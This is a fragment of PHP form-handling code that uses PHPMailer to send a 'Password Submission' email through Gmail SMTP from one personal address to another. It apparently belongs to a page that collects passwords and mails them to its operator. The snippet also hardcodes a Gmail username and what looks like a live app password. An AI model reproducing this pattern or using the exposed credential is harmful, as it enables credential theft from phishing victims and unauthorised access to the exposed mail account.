...
if(isset($_POST['ButtonNext']))
{
  ...
  try {
      ...
      $mail->Username   = 'asad.ali.nizamani.official@gmail.com';                     //SMTP username
      $mail->Password   = 'padu kzgr jpye ukzz';                               //SMTP password
      $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
      $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

      //Recipients
      $mail->setFrom('asad.ali.nizamani.official@gmail.com', 'Password Submission');
      $mail->addAddress('asad.bari.official@gmail.com', 'Password Submission');
